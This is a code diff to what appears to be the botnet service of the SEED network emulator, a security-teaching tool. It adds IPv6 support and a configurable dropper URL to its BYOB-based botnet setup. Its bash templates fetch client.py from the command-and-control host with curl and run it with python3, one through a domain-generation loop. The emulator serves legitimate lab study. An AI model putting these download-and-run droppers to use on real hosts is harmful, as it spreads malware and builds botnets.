@@ -2,8 +2,17 @@
 # encoding: utf-8
 # __author__ = 'Demon'
 from __future__ import annotations
-from seedemu.core import Node, Service, Server, Emulator
-from typing import Dict
+from seedemu.core import (
+    AddressFamily,
+    Node,
+    Service,
+    Server,
+    Emulator,
+    formatUrl,
+    getNodeAddress,
+    normalizeAddressFamily,
+)
+from typing import Dict, Union
 
 BYOB_VERSION = 'b4946908b8a3691f75a7e15ffe6883ef509afc91'
 
@@ -11,7 +20,14 @@ BotnetServerFileTemplates: Dict[str, str] = {}
 
 BotnetServerFileTemplates['client_dropper_runner'] = '''\
 #!/bin/bash
-url="http://$1:$2/clients/droppers/client.py"
+url="$3"
+if [ -z "$url" ]; then
+    host="$1"
+    if [[ "$host" == *:* && "${host:0:1}" != "[" ]]; then
+        host="[$host]"
+    fi
+    url="http://$host:$2/clients/droppers/client.py"
+fi
 until curl -sHf "$url" -o client.py > /dev/null; do {
     echo "botnet-client: server $1:$2 not ready, waiting..."
     sleep 1
@@ -22,11 +38,29 @@ python3 client.py &
 
 BotnetServerFileTemplates['client_dropper_runner_dga'] = '''\
 #!/bin/bash
+format_dropper_url() {
+    local host="$1"
+    if [[ "$host" =~ ^https?:// ]]; then
+        echo "$host"
+        return
+    fi
+
+    local authority="$host"
+    if [[ "$authority" == *:* && "${authority:0:1}" != "[" ]]; then
+        local colon_count="${authority//[^:]}"
+        if [ "${#colon_count}" -gt 1 ]; then
+            authority="[$authority]"
+        fi
+    fi
+
+    echo "http://$authority/clients/droppers/client.py"
+}
+
 chmod +x /dga
 while true; do {
     host="`/dga | shuf -n1`"
     echo "botnet-client: dga: trying $host..."
-    url="http://$host/clients/droppers/client.py"
+    url="$(format_dropper_url "$host")"
     curl -sHf "$url" -o client.py && {
         echo "botnet-client: dga: $host works!"
         python3 client.py
@@ -79,18 +113,17 @@ pyHook==1.5.1;sys.platform=='win32'
 pypiwin32==223;sys.platform=='win32'
 '''
 
-BotnetServerFileTemplates['byob_patch_py'] = '''\
-#!/usr/bin/env python3
+BotnetServerFileTemplates['byob_patch_py'] = r'''#!/usr/bin/env python3
 import re, pathlib
 root = pathlib.Path('/tmp/byob')
 targets = ['byob/core/util.py','byob/modules/util.py']
 for rel in targets:
     p = root / rel
     s = p.read_text(encoding='utf-8')
-    s = re.sub(r'def\s+public_ip\s*\(\)\s*:[\s\S]*?(?=\\n\s*def\s|\\Z)',
-               'def public_ip():\\n    """Return public IP address of host machine"""\\n    return local_ip()\\n\\n', s)
-    s = re.sub(r'def\s+geolocation\s*\(\)\s*:[\s\S]*?(?=\\n\s*def\s|\\Z)',
-               'def geolocation():\\n    """Return latitude/longitude of host machine (tuple)"""\\n    return ("0", "0")\\n\\n', s)
+    s = re.sub(r'def\s+public_ip\s*\(\)\s*:[\s\S]*?(?=\n\s*def\s|\Z)',
+               'def public_ip():\n    """Return public IP address of host machine"""\n    return local_ip()\n\n', s)
+    s = re.sub(r'def\s+geolocation\s*\(\)\s*:[\s\S]*?(?=\n\s*def\s|\Z)',
+               'def geolocation():\n    """Return latitude/longitude of host machine (tuple)"""\n    return ("0", "0")\n\n', s)
     p.write_text(s, encoding='utf-8')
 '''
 
@@ -102,6 +135,7 @@ class BotnetServer(Server):
 
     __port: int
     __files: Dict[str, str]
+    __endpoint_address_family: AddressFamily
 
     def __init__(self):
         """!
@@ -110,6 +144,7 @@ class BotnetServer(Server):
         super().__init__()
         self.__port = 445
         self.__files = {}
+        self.__endpoint_address_family = AddressFamily.IPv4
 
     def setPort(self, port: int) -> BotnetServer:
         """!
@@ -125,6 +160,20 @@ class BotnetServer(Server):
         @returns self, for chaining API calls.
         """
         self.__port = port
+        return self
+
+    def setEndpointAddressFamily(self, family: Union[AddressFamily, str, int]) -> BotnetServer:
+        """!
+        @brief Select the address family advertised for Botnet C2/dropper endpoints.
+
+        Defaults to IPv4 to preserve existing Botnet behavior. IPv6 selection is
+        only used when the bound node has explicit IPv6 address state.
+
+        @param family address family selector.
+
+        @returns self, for chaining API calls.
+        """
+        self.__endpoint_address_family = normalizeAddressFamily(family)
         return self
 
     def addFile(self, content: str, path: str):
@@ -150,7 +199,11 @@ class BotnetServer(Server):
         """!
         @brief Install the Botnet C2 server.
         """
-        address = str(node.getInterfaces()[0].getAddress())
+        address = getNodeAddress(node, self.__endpoint_address_family, preferLocal=False)
+        assert address is not None, 'BotnetServer install: node as{}/{} has no {} address'.format(
+            node.getAsn(), node.getName(), self.__endpoint_address_family.value
+        )
+        address = str(address)
 
         # add user files
         for (path, body) in self.__files.items():
@@ -189,6 +242,10 @@ class BotnetServer(Server):
         # set attributes for client to find us
         node.setAttribute('botnet_addr', address)
         node.setAttribute('botnet_port', self.__port + 1)
+        node.setAttribute(
+            'botnet_dropper_url',
+            formatUrl("http", address, self.__port + 1, "/clients/droppers/client.py")
+        )
          
     def print(self, indent: int) -> str:
         out = ' ' * indent
@@ -289,12 +346,15 @@ class BotnetClientServer(Server):
 
         addr = server.getAttribute('botnet_addr', None)
         port = server.getAttribute('botnet_port', None)
+        dropper_url = server.getAttribute('botnet_dropper_url', None)
 
         assert addr != None and port != None, 'cannot find server details from botnet controller the node on {} (as{}/{}). is botnet controller installed on it?'.format(self.__server, server.getAsn(), server.getName())
+        if dropper_url == None:
+            dropper_url = formatUrl("http", addr, port, "/clients/droppers/client.py")
 
         # get and run dropper from server.
         node.appendStartCommand('chmod +x /tmp/byob_client_dropper_runner')
-        node.appendStartCommand('/tmp/byob_client_dropper_runner "{}" "{}"'.format(addr, port), fork)
+        node.appendStartCommand('/tmp/byob_client_dropper_runner "{}" "{}" "{}"'.format(addr, port, dropper_url), fork)
 
     def print(self, indent: int) -> str:
         out = ' ' * indent
